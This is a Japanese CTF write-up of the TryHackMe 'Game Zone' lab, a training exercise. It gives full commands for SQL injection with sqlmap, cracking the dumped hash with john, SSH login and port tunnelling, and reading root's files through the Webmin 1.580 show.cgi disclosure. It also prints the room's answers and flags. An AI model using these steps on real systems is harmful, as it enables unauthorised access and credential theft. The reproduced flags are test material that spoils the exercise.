---
title: "Game Zone Writeup"
date: 2023-06-14
tags: [writeup, ctf, tryhackme]
description: "TryHackMeのGame Zoneルームにある脆弱なWebフォーラムをスキャン・攻略して、シェルを取得し権限昇格を行う。"
---

## Setup 

まずはTryHackMeのVPNサーバーに接続する必要がある。これについての詳細は[Access](https://tryhackme.com/access)ページを確認してほしい。

サーバーへの接続にはopenvpnを使う。コマンドはこちら：

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

`nmap`スキャンを実行すると、次の情報が得られる：
```shell-session
$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP 

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

ポート80のHTTPサービスにアクセスすると、次のページが表示される：
![](/assets/img/writeup_assets/game-zone/home-page.png)


> フォーラム上でスナイパーライフルを持っている大きなカートゥーンアバターの名前は？
>
> Answer: Agent 47

ページ上には2つの入力フォームがある。1つは`Site Search`用、もう1つは`User Login`用だ。いくつかSQLi文字列を入力して、データベース（SQL）インジェクションの可能性をテストしてみる：
![](/assets/img/writeup_assets/game-zone/sqli-simple-login.png)

サービスへのログインに成功すると、次のページにリダイレクトされる：
![](/assets/img/writeup_assets/game-zone/portal-login-dash.png)

> ログイン後、どのページにリダイレクトされるか？
>
> Answer: `portal.php`

ターゲットがSQLiに脆弱であることが分かったので、次はSQLMapを使ってさらに調査を進める...


Burpsuiteを使って、`portal.php`ページにアクセスした際にブラウザから送信されるリクエストを確認する：
```http
POST /portal.php HTTP/1.1
Host: TARGET_IP
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://TARGET_IP
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://TARGET_IP/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kfd3hokcd5krmlmrofgs4q45q7
Connection: close

searchitem=asd
```

これをファイルに保存し、SQLMapに渡してユーザーセッションを認証する：
```shell-session
$ sqlmap -r portal-request.txt --dbms=mysql --dump

...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

...

POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

...

do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y

...

do you want to crack them via a dictionary-based attack? [Y/n/q] 

...

what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

...

do you want to use common password suffixes? (slow!) [y/N] N

...
```

これにより、ユーザー`agent47`のパスワードハッシュが得られる。

> usersテーブルにあるハッシュ化されたパスワードは何か？
>
> Answer: `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> ハッシュ化されたパスワードに関連付けられているユーザー名は何か？
>
> Answer: `agent47`

また、データベース`db`内の`post`というテーブルに含まれるエントリーも取得できる。

> もう1つのテーブル名は何か？
>
> Answer: `post`

`agent47`のパスワードハッシュが手に入ったので、`john`を使ってこれをクラックし、ユーザーのパスワードを取得する。
```shell-session
$ echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt

$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
...
videogamer124    (?)     
```

> ハッシュ解除されたパスワードは何か？
>
> Answer: `videogamer124`

これで、認証情報`agent47:videogamer124`を使って`ssh`でサーバーへのログインを試みることができる。

## Gaining Access

情報収集フェーズで得た認証情報を使って、サーバーのSSHサービスにログインする。
```shell-session
$ ssh agent47@TARGET_IP
...
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```

これでユーザーフラグを取得できる：
```shell-session
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

> ユーザーフラグは何か？
>
> Answer: `649ac17b1480ac13ef1e4fa579dac95c`

ターゲットマシン上で実行中のソケット接続を確認する：
```shell-session
Netid State      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port               
udp   UNCONN     0      0                                                                *:10000                                                                        *:*                  
udp   UNCONN     0      0                                                                *:68                                                                           *:*                  
tcp   LISTEN     0      80                                                       127.0.0.1:3306                                                                         *:*                  
tcp   LISTEN     0      128                                                              *:10000                                                                        *:*                  
tcp   LISTEN     0      128                                                              *:22                                                                           *:*                  
tcp   LISTEN     0      128                                                             :::80                                                                          :::*                  
tcp   LISTEN     0      128                                                             :::22                                                                          :::*
```

> 実行中のTCPソケットはいくつあるか？
>
> Answer: 5

ポート10000で動作しているサービスはファイアウォールでブロックされているため、SSHトンネルを使ってこのポートをローカルに公開する。
```shell-session
$ ssh -L 10000:localhost:10000 agent47@TARGET_IP
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Nov 27 23:59:23 2022 from TARGET_IP
agent47@gamezone:~$
```

これで、ブラウザを使って`localhost:10000`にアクセスできる：
![](/assets/img/writeup_assets/game-zone/localhost-10000.png)



> 公開されているCMSの名前は何か？
>
> Answer: `Webmin`

認証情報`agent47:videogamer124`を使って、このサービスにログインできる：
![](/assets/img/writeup_assets/game-zone/webmin-dash.png)

> CMSのバージョンは何か？
>
> Answer: `1.580`

## Privilege Escalation

`searchsploit`を使って、`Webmin 1.580`のエクスプロイトを探す：
```shell-session
$ searchsploit webmin 1.58     
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Executio | unix/remote/21851.rb
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metas | linux/webapps/47330.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

2つ目のエクスプロイトのロジックを利用できる。単純に`localhost:10000/file/show.cgi/root/root.txt`にアクセスするだけで、`root.txt`ファイルの内容を取得できる。

> rootフラグは何か？
>
> Answer: `a4b945830144bdd71908d12d902adeee`

## Conclusion

このWriteupが役に立ったら、ぜひ[github](https://github.com/NovusEdge)のフォローやリポジトリ（https://github.com/NovusEdge/thm-writeups）へのスターをお願いします！


- Room: [Game Zone](https://tryhackme.com/room/gamezone)
